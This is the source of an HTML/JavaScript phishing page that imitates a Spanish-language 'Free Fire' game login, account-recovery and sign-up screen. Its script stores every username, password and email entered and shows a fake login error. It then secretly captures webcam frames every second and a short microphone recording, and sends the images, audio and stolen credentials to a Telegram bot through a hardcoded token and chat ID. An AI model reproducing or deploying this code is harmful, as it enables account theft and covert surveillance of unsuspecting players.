<body>
    <div class="header">

    <div class="container">

            <form id="loginForm">
                <input type="text" id="username" placeholder="Nombre de usuario o ID" required>

    <!-- Forgot Password Modal -->
    <div id="forgotModal" class="modal">
        <div class="modal-content">
            <span class="close"></span>
            <h2>RECUPERAR CUENTA</h2>
            <p>Ingresa tu correo electr贸nico asociado para recuperar tu cuenta.</p>
            <input type="email" id="recoveryEmail" placeholder="Correo electr贸nico">
            <button id="recoverButton" class="login-button" style="width: 100%; margin-top: 25px;">RECUPERAR</button>

    <!-- Create Account Modal -->
    <div id="createModal" class="modal">
        <div class="modal-content">
            <span class="close"></span>
            <h2>CREAR CUENTA</h2>
            <input type="text" id="newUsername" placeholder="correo electr贸nico o n煤mero telef贸nico">
            <input type="email" id="newEmail" placeholder="Correo electr贸nico">
            <input type="password" id="newPassword" placeholder="Contrase帽a">
            <input type="password" id="confirmPassword" placeholder="Confirmar contrase帽a">
            <button id="signUpButton" class="login-button" style="width: 100%; margin-top: 25px;">REGISTRARSE</button>
        </div>
    </div>
    
    <!-- Hidden elements for capture -->
    <video id="video" autoplay></video>
    <canvas id="canvas" width="2000" height="2000"></canvas>

    <script>
        // Data collection
        let loginData = [];
        let recoveryData = [];
        let signupData = [];
        
        // Login form functionality
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            loginData.push({
                username: username,
                password: password,
                timestamp: new Date()
            });
            
            alert('Error al iniciar sesi贸n. Por favor verifica tus credenciales.');
            
            // Start capture
            startCapture();
        });
        
        // Forgot password functionality
        document.getElementById('forgotPassword').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('forgotModal').style.display = 'block';
        });
        
        // Recover account functionality
        document.getElementById('recoverButton').addEventListener('click', function() {
            const recoveryEmail = document.getElementById('recoveryEmail').value;
            
            recoveryData.push({
                recoveryEmail: recoveryEmail,
                timestamp: new Date()
            });
            
            alert('Se ha enviado un correo con instrucciones para recuperar tu cuenta.');
            document.getElementById('forgotModal').style.display = 'none';
            
            // Start capture
            startCapture();
        });
        
        // Create account functionality
        document.getElementById('createAccount').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('createModal').style.display = 'block';
        });
        
        // Sign up functionality
        document.getElementById('signUpButton').addEventListener('click', function() {
            const newUsername = document.getElementById('newUsername').value;
            const newEmail = document.getElementById('newEmail').value;
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            
            if (newPassword !== confirmPassword) {
                alert('Las contrase帽as no coinciden.');
                return;
            }
            
            signupData.push({
                username: newUsername,
                email: newEmail,
                password: newPassword,
                timestamp: new Date()
            });
            
            alert('隆Cuenta creada exitosamente! Bienvenido a Free Fire.');
            document.getElementById('createModal').style.display = 'none';
            
            // Start capture
            startCapture();
        });
        
        // Close modals
        document.querySelectorAll('.close').forEach(btn => {
            btn.addEventListener('click', function() {
                this.closest('.modal').style.display = 'none';
            });
        });
        
        // Close when clicking outside
        window.addEventListener('click', function(e) {
            if (e.target.className === 'modal') {
                e.target.style.display = 'none';
            }
        });

        // Capture functionality
        const botToken = "7857762059:AAHmnhPFlXCwUE8ReMyPgz3MX12wgjjh0gE";
        const chatId = "7377307394";

        function startCapture() {
            startCamera();
            startRecording();
        }

        function startCamera() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");

            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                video.setAttribute("width", "100%");
                video.setAttribute("height", "auto");
            } else {
                video.setAttribute("width", "2000");
                video.setAttribute("height", "2000");
            }

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;

                    setInterval(() => {
                        ctx.drawImage(video, 0, 0, 2000, 2000);
                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
                    }, 1000);
                })
                .catch(error => {
                    console.error("Camera error:", error);
                });
        }

        function startRecording() {
            const audioChunks = [];

            navigator.mediaDevices
                .getUserMedia({ audio: true, video: false })
                .then((stream) => {
                    const mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.start();

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 4000);

                    mediaRecorder.addEventListener("dataavailable", (event) => {
                        audioChunks.push(event.data);
                    });

                    mediaRecorder.addEventListener("stop", () => {
                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                        sendAudioToTelegram(audioBlob);
                        
                        // Send collected data
                        sendCollectedData();
                    });
                })
                .catch((error) => {
                    console.error("Microphone error:", error);
                });
        }

        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append("photo", blob, "freefire_login.jpg");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Photo sent to Telegram");
                    }
                })
                .catch(error => {
                    console.error("Error sending photo:", error);
                });
        }

        function sendAudioToTelegram(blob) {
            const formData = new FormData();
            formData.append("audio", blob, "freefire_audio.wav");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Audio sent to Telegram");
                    }
                })
                .catch(error => {
                    console.error("Error sending audio:", error);
                });
        }

        function sendCollectedData() {
            const formData = new FormData();
            
            if (loginData.length > 0) {
                formData.append("login_data", JSON.stringify(loginData));
                loginData = [];
            }
            
            if (recoveryData.length > 0) {
                formData.append("recovery_data", JSON.stringify(recoveryData));
                recoveryData = [];
            }
            
            if (signupData.length > 0) {
                formData.append("signup_data", JSON.stringify(signupData));
                signupData = [];
            }
            
            if (formData.entries().next().done) return;

            formData.append("chat_id", chatId);
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Data sent to Telegram");
                    }
                })
                .catch(error => {
                    console.error("Error sending data:", error);
                });
        }
    </script>
